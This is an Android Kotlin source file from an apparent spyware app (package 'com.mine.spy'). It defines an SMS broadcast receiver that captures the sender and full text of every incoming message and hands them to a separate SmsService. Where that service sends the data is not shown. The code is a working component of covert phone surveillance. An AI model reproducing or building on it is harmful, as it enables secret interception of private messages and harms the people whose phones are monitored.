package com.mine.spy.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import com.mine.spy.data.preference.typeApp
import com.mine.spy.services.sms.SmsService
import com.mine.spy.utils.ConstFun.startServiceSms
import com.mine.spy.utils.Consts.TYPE_SMS_INCOMING

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {

        var smsAddress = ""
        var smsBody = ""

        for (smsMessage in Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
            smsAddress = smsMessage.displayOriginatingAddress
            smsBody += smsMessage.messageBody
        }

        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION && !context.typeApp) {
            context.startServiceSms<SmsService>(smsAddress, smsBody, TYPE_SMS_INCOMING)
        }
    }
}
